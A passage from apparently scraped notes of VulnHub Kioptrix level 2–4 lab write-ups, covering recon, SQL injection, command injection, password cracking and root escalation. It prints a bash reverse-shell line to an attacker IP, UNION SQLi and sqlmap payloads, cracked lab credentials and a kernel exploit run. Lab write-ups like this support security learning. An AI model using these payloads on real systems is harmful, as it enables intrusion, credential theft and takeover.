2.6.24 - 2.6.36 (94%), Linux 2.6.9 - 2.6.33 (94%), Linux 2.6.13 - 2.6.32 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nHost script results:\n|_clock-skew: -2h09m39s\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.64 seconds\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#exploit","title":"exploit","text":"<ul> <li>80 - apache - http</li> </ul> <pre><code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))\n\nhttp://192.168.123.75/index.php\n\n&lt;!-- Start of HTML when logged in as Administator --&gt;\n\n\n-&gt; path: nothing\n\n$ dirb http://$IP\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Wed Nov 15 04:22:32 2023\nURL_BASE: http://192.168.123.75/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.123.75/ ----\n+ http://192.168.123.75/cgi-bin/ (CODE:403|SIZE:290)\n+ http://192.168.123.75/index.php (CODE:200|SIZE:667)\n==&gt; DIRECTORY: http://192.168.123.75/manual/\n+ http://192.168.123.75/usage (CODE:403|SIZE:287)\n</code></pre> <ul> <li>crack password [x]</li> <li>user : pass -&gt; mysql's users table -&gt; sqli</li> </ul> <pre><code>Administator' or 1=1 -- -:1\n</code></pre> <ul> <li>command injection poc</li> </ul> <pre><code>Ping a Machine on the Network: \ngoogle.com\n\nPING google.com (172.217.31.14) 56(84) bytes of data.\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.31 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=4.34 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=6.24 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 4.315/4.968/6.249/0.909 ms, pipe 2\n\n-&gt; command injection -&gt; get a shell\n\ngoogle.com; cat /etc/passwd\n\nPING google.com (172.217.31.14) 56(84) bytes of data.\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.66 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=3.96 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=3.75 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2001ms\nrtt min/avg/max/mdev = 3.750/4.127/4.669/0.392 ms, pipe 2\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/etc/news:\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\nrpm:x:37:37::/var/lib/rpm:/sbin/nologin\nhaldaemon:x:68:68:HAL daemon:/:/sbin/nologin\nnetdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash\nnscd:x:28:28:NSCD Daemon:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nrpc:x:32:32:Portmapper RPC user:/:/sbin/nologin\nmailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\nsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\npcap:x:77:77::/var/arpwatch:/sbin/nologin\napache:x:48:48:Apache:/var/www:/sbin/nologin\nsquid:x:23:23::/var/spool/squid:/sbin/nologin\nwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin\nxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\npegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash\njohn:x:500:500::/home/john:/bin/bash\nharold:x:501:501::/home/harold:/bin/bash\n</code></pre> <ul> <li>command injection exploit</li> </ul> <pre><code>google.com; bash -i &gt;&amp; /dev/tcp/192.168.123.99/2233 0&gt;&amp;1\nsudo rlwrap nc -lvnp 2233\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#priv-esc","title":"priv-esc","text":"<ul> <li>enum</li> </ul> <pre><code>bash-3.00$ ip a\n1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0\n    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link\n       valid_lft forever preferred_lft forever\n3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop\n    link/sit 0.0.0.0 brd 0.0.0.0\nbash-3.00$ uname -a\nLinux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux\nbash-3.00$ whoami\napache\nbash-3.00$ id\nuid=48(apache) gid=48(apache) groups=48(apache)\n</code></pre> <ul> <li>mysql conn [x]</li> </ul> <pre><code>bash-3.00$ cat index.php\n&lt;?php\n        mysql_connect(\"localhost\", \"john\", \"hiroshima\") or die(mysql_error());\n        //print \"Connected to MySQL&lt;br /&gt;\";\n        mysql_select_db(\"webapp\");\n\n        if ($_POST['uname'] != \"\"){\n                $username = $_POST['uname'];\n                $password = $_POST['psw'];\n                $query = \"SELECT * FROM users WHERE username = '$username' AND password='$password'\";\n                //print $query.\"&lt;br&gt;\";\n                $result = mysql_query($query);\n\n                $row = mysql_fetch_array($result);\n                //print \"ID: \".$row['id'].\"&lt;br /&gt;\";\n        }\n\n?&gt;\n\nconn mysql [x]\nmysql -u john -p hiroshima\n</code></pre> <ul> <li>linux kernel priv-esc: Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) - Linux_x86 local Exploit (exploit-db.com)</li> </ul> <pre><code>$ searchsploit Linux Kernel CentOS 2.6.9\nLinux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) | linux_x86/local/9542.c\n\nShellcodes: No Results\n\nbash-3.00$ gcc 9542.c -o 9542\n9542.c:109:28: warning: no newline at end of file\nbash-3.00$ echo \"\" &gt;&gt; 9542.c\nbash-3.00$ gcc 9542.c -o 9542\nsh-3.00# chmod +x 9542\nsh-3.00# ./9542\n[-] check ur uid\nsh-3.00# ip a\n1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0\n    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link\n       valid_lft forever preferred_lft forever\n3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop\n    link/sit 0.0.0.0 brd 0.0.0.0\nsh-3.00# id\nuid=0(root) gid=0(root) groups=48(apache)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/","title":"KIOPTRIX LEVEL 1.2 (3)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.2 (#3)</li> <li>Date release: 18 Apr 2011</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li> <p>Web page: http://www.kioptrix.com/blog/?p=358</p> </li> <li> <p>Vulnhub: Kioptrix: Level 1.2 (#3) ~ VulnHub</p> </li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#recon","title":"recon","text":"<pre><code>$ sudo nmap -sT -sV -sC -O -p22,80 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 16:57 CST\nNmap scan report for kioptrix3.com (192.168.123.84)\nHost is up (0.00052s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\n| ssh-hostkey:\n|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)\n|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)\n80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\n|_http-title: Ligoat Security - Got Goat? Security ...\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\nMAC Address: 00:0C:29:65:C4:91 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.99 seconds\n</code></pre> <ul> <li> <p>80 - http - key endpoint</p> </li> <li> <p>OS: Ubuntu 2.2.8</p> </li> <li> <p>Web: Apache, gallery CMS Ligoat</p> </li> <li> <p>check html code:</p> </li> </ul> <pre><code>- view-source:http://kioptrix3.com/\n\nname of author - Manjeet Singh Sawhney   www.manjeetss.com\nLotusCMS\n\n&lt;!-- Leaving in my name and website link will be greatly appreciated in return for offering you this template for free. Thanking you in advance. --&gt;\n</code></pre> <ul> <li>CMS: LotusCMS</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#lotuscms-x","title":"LotusCMS [x]","text":"<p>This exp method is not recommended. Because RCE is discovered in 2012, while this machine is released in 2011.</p> <pre><code>$ searchsploit LotusCMS\n[y] LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                             | php/remote/18565.rb\n[x] LotusCMS 3.0.3 - Multiple Vulnerabilities                                                 | php/webapps/16982.txt\n</code></pre> <p>Simply exhibit the exp process:</p> <p></p> <p>burp to capture this packet and change it to POST request:</p> <p></p> <p>poc:</p> <p></p> <p>get a shell:</p> <p></p>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#gallery","title":"gallery","text":"<p>Check gallery cms, seek around vulns and find a sqli vuln:</p> <p></p> <p></p>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#manual-sqli","title":"manual sqli","text":"<ul> <li><code>?id=1 UNION ALL SELECT NULL,database(),version(),NULL,NULL,NULL -- -</code></li> <li><code>?id=1 UNION ALL SELECT NULL,group_concat(table_name),NULL,NULL,NULL,NULL from information_schema.tables where table_schema='gallery' -- -</code></li> </ul> <ul> <li> <p>gallarific_users [x], dev_accounts [y]</p> </li> <li> <p><code>?id=1 UNION ALL SELECT NULL,group_concat(column_name),NULL,NULL,NULL,NULL from information_schema.columns where table_schema='gallery' and table_name='dev_accounts' -- -</code></p> </li> </ul> <p></p> <ul> <li><code>?id=1 UNION ALL SELECT NULL,group_concat(id,'~',username,'~',password),NULL,NULL,NULL,NULL from gallery.dev_accounts -- -</code></li> </ul> <p></p> <ul> <li>crack passwords</li> </ul> <pre><code>dreg : 0d3eccfb887aabd50f243b3f155c0f85\nloneferret : 5badcaf789d3d1d09794d8f021f40f0e\n\n$ hashcat -m 0 -a 0 '0d3eccfb887aabd50f243b3f155c0f85' rockyou.txt --show\n0d3eccfb887aabd50f243b3f155c0f85:Mast3r\n$ hashcat -m 0 -a 0 '5badcaf789d3d1d09794d8f021f40f0e' rockyou.txt --show\n5badcaf789d3d1d09794d8f021f40f0e:starwars\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#sqlmap","title":"sqlmap","text":"<pre><code>$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1'\n\n$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T gallarific_users --dump # [x]\n\n$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T dev_accounts --dump\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 05:35:05 /2023-11-16/\n\n[05:35:05] [INFO] resuming back-end DBMS 'mysql'\n[05:35:05] [INFO] testing connection to the target URL\n[05:35:05] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=e324d68785c...c837c2c3b2'). Do you want to use those [Y/n]\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: Boolean-based blind - Parameter replace (original value)\n    Payload: id=(SELECT (CASE WHEN (8978=8978) THEN 1 ELSE (SELECT 8402 UNION SELECT 7981) END))\n\n    Type: error-based\n    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)\n    Payload: id=1 OR ROW(4218,6009)&gt;(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(4218=4218,1))),0x716b766271,FLOOR(RAND(0)*2))x FROM (SELECT 2632 UNION SELECT 9035 UNION SELECT 9554 UNION SELECT 9939)a GROUP BY x)\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND (SELECT 7588 FROM (SELECT(SLEEP(5)))lcXH)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 6 columns\n    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71627a7a71,0x4a71716c674d7a574567667369784c5578716251584c5343497964727167624a5244554d4d474f7a,0x716b766271),NULL,NULL,NULL,NULL-- -\n---\n[05:35:06] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 8.04 (Hardy Heron)\nweb application technology: Apache 2.2.8, PHP, PHP 5.2.4\nback-end DBMS: MySQL &gt;= 4.1\n[05:35:06] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'\n[05:35:06] [INFO] retrieved: 'id','int(10)'\n[05:35:06] [INFO] retrieved: 'username','varchar(50)'\n[05:35:06] [INFO] retrieved: 'password','varchar(50)'\n[05:35:06] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'\n[05:35:06] [INFO] retrieved: '1','0d3eccfb887aabd50f243b3f155c0f85','dreg'\n[05:35:06] [INFO] retrieved: '2','5badcaf789d3d1d09794d8f021f40f0e','loneferret'\n[05:35:06] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N]\ndo you want to crack them via a dictionary-based attack? [Y/n/q]\n[05:35:09] [INFO] using hash method 'md5_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[05:35:13] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N]\n[05:35:15] [INFO] starting dictionary-based cracking (md5_generic_passwd)\n[05:35:15] [INFO] starting 4 processes\n[05:35:16] [INFO] cracked password 'Mast3r' for user 'dreg'\n[05:35:17] [INFO] cracked password 'starwars' for user 'loneferret'\nDatabase: gallery\nTable: dev_accounts\n[2 entries]\n+----+---------------------------------------------+------------+\n| id | password                                    | username   |\n+----+---------------------------------------------+------------+\n| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |\n| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |\n+----+---------------------------------------------+------------+\n\n[05:35:19] [INFO] table 'gallery.dev_accounts' dumped to CSV file '/home/qwe/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv'\n[05:35:19] [WARNING] HTTP error codes detected during run:\n500 (Internal Server Error) - 1 times\n[05:35:19] [INFO] fetched data logged to text files under '/home/qwe/.local/share/sqlmap/output/kioptrix3.com'\n\n[*] ending @ 05:35:19 /2023-11-16/\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#priv-esc","title":"priv-esc","text":"<p>creds:</p> <ul> <li>dreg:Mast3r</li> <li>loneferret:starwars</li> </ul> <p>ssh to connect the machine:</p> <pre><code>ssh -oHostKeyAlgorithms=+ssh-rsa loneferret@$IP\nloneferret@Kioptrix3:~$ sudo -l\nsudo -l\nUser loneferret may run the following commands on this host:\n    (root) NOPASSWD: !/usr/bin/su\n    (root) NOPASSWD: /usr/local/bin/ht\n</code></pre> <p>use ht to change /etc/sudoers</p> <p></p> <p></p> <pre><code>loneferret@Kioptrix3:~$ sudo su root\nroot@Kioptrix3:/home/loneferret#\n\nroot@Kioptrix3:~# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:65:c4:91 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.84/24 brd 192.168.123.255 scope global eth1\n    inet6 fe80::20c:29ff:fe65:c491/64 scope link\n       valid_lft forever preferred_lft forever\nroot@Kioptrix3:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Kioptrix3:~# whoami\nroot\nroot@Kioptrix3:~# cat Congrats.txt\nGood for you for getting here.\nRegardless of the matter (staying within the spirit of the game of course)\nyou got here, congratulations are in order. Wasn't that bad now was it.\n\nWent in a different direction with this VM. Exploit based challenges are\nnice. Helps workout that information gathering part, but sometimes we\nneed to get our hands dirty in other things as well.\nAgain, these VMs are beginner and not intented for everyone.\nDifficulty is relative, keep that in mind.\n\nThe object is to learn, do some research and have a little (legal)\nfun in the process.\n\n\nI hope you enjoyed this third challenge.\n\nSteven McElrea\naka loneferret\nhttp://www.kioptrix.com\n\n\nCredit needs to be given to the creators of the gallery webapp and CMS used\nfor the building of the Kioptrix VM3 site.\n\nMain page CMS:\nhttp://www.lotuscms.org\n\nGallery application:\nGallarific 2.1 - Free Version released October 10, 2009\nhttp://www.gallarific.com\nVulnerable version of this application can be downloaded\nfrom the Exploit-DB website:\nhttp://www.exploit-db.com/exploits/15891/\n\nThe HT Editor can be found here:\nhttp://hte.sourceforge.net/downloads.html\nAnd the vulnerable version on Exploit-DB here:\nhttp://www.exploit-db.com/exploits/17083/\n\n\nAlso, all pictures were taken from Google Images, so being part of the\npublic domain I used them.\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/","title":"KIOPTRIX LEVEL 1.3 (4)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.3 (#4)</li> <li>Date release: 8 Feb 2012</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?p=604</li> <li>Vulnhub: Kioptrix: Level 1.3 (#4) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#recon","title":"recon","text":"<ul> <li><code>$ sudo nmap -sT -sV -sC -O -p22,80,139,445 $IP -oA nmap/detail</code></li> </ul> <pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 14:05 CST\nNmap scan report for 192.168.123.93\nHost is up (0.00072s latency).\n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\n| ssh-hostkey:\n|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)\n|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)\n80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open              Samba smbd 3.0.28a (workgroup: WORKGROUP)\nMAC Address: 00:0C:29:A9:40:2B (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.12 - 2.6.14 (embedded), Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.28a)\n|   Computer name: Kioptrix4\n|   NetBIOS computer name:\n|   Domain name: localdomain\n|   FQDN: Kioptrix4.localdomain\n|_  System time: 2023-11-16T09:05:23-05:00\n|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#139-445-smb","title":"139, 445 - smb","text":"<ul> <li>file leakage, <code>$ smbmap -H $IP</code>, no access [x]</li> </ul> <pre><code>    ________  ___      ___  _______   ___      ___       __         _______\n   /\"       )|\"  \\    /\"  ||   _  \"\\ |\"  \\    /\"  |     /\"\"\\       |   __ \"\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /\n   /\" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com\n                     https://github.com/ShawnDEvans/smbmap\n\n[*] Detected 1 hosts serving SMB\n[*] Established 1 SMB session(s)\n\n[+] IP: 192.168.123.93:445      Name: 192.168.123.93            Status: Authenticated\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        IPC$                                                    NO ACCESS       IPC Service (Kioptrix4 server (Samba, Ubuntu))\n</code></pre> <ul> <li><code>enum4linux $IP</code>, get 4 usernames (seek password if possible):</li> <li>root</li> <li>robert</li> <li>john</li> <li>loneferret</li> </ul> <pre><code>[+] Got OS info for 192.168.123.93 from srvinfo:\n        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)\n        platform_id     :       500\n        os version      :       4.9\n        server type     :       0x809a03\n\n\n[+] Enumerating users using SID S-1-22-1 and logon username '', password ''\n\nS-1-22-1-1000 Unix User\\loneferret (Local User)\nS-1-22-1-1001 Unix User\\john (Local User)\nS-1-22-1-1002 Unix User\\robert (Local User)\n\nuser:[nobody] rid:[0x1f5]\nuser:[robert] rid:[0xbbc]\nuser:[root] rid:[0x3e8]\nuser:[john] rid:[0xbba]\nuser:[loneferret] rid:[0xbb8]\n</code></pre> <ul> <li>smb version using metasploit: Samba 3.0.28a</li> </ul> <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; run\n\n[*] 192.168.123.93:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)\n[*] 192.168.123.93:445    -   Host could not be identified: Unix (Samba 3.0.28a)\n[*] 192.168.123.93:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#image-source-checking","title":"image source checking","text":"<p>nothing special here.</p> <ul> <li>http://192.168.123.93/images/cartoon_goat.png</li> <li><code>$ exiftool cartoon_goat.png</code></li> <li><code>$ binwalk cartoon_goat.png</code></li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#80-http","title":"80 - http","text":"<ul> <li>path recon: <code>$ sudo gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></li> </ul> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.123.93\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 356] [--&gt; http://192.168.123.93/images/]\n/index                (Status: 200) [Size: 1255]\n/member               (Status: 302) [Size: 220] [--&gt; index.php]\n/logout               (Status: 302) [Size: 0] [--&gt; index.php]\n/john                 (Status: 301) [Size: 354] [--&gt; http://192.168.123.93/john/]\n/robert               (Status: 301) [Size: 356] [--&gt; http://192.168.123.93/robert/]\n/server-status        (Status: 403) [Size: 334]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <ul> <li>sensitive data leakage:</li> <li>http://192.168.123.93/database.sql</li> <li>username john in database X table members</li> <li>column_name: id, username, password -&gt; sqli (next procedure)</li> </ul> <pre><code>CREATE TABLE `members` (\n`id` int(4) NOT NULL auto_increment,\n`username` varchar(65) NOT NULL default '',\n`password` varchar(65) NOT NULL default '',\nPRIMARY KEY (`id`)\n) TYPE=MyISAM AUTO_INCREMENT=2 ;\n\n-- \n-- Dumping data for table `members`\n-- \n\nINSERT INTO `members` VALUES (1, 'john', '1234');\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#sqli","title":"sqli","text":"<ul> <li>find the injection point</li> </ul> <ul> <li>copy packet data into local machine and use sqlmap to exp</li> <li>validate sqli</li> <li>dump username and password<ul> <li><code>john:MyNameIsJohn</code></li> <li><code>robert:ADGAdsafdfwt4gadfga==</code></li> </ul> </li> </ul> <pre><code>$ cat post.txt\nPOST /checklogin.php 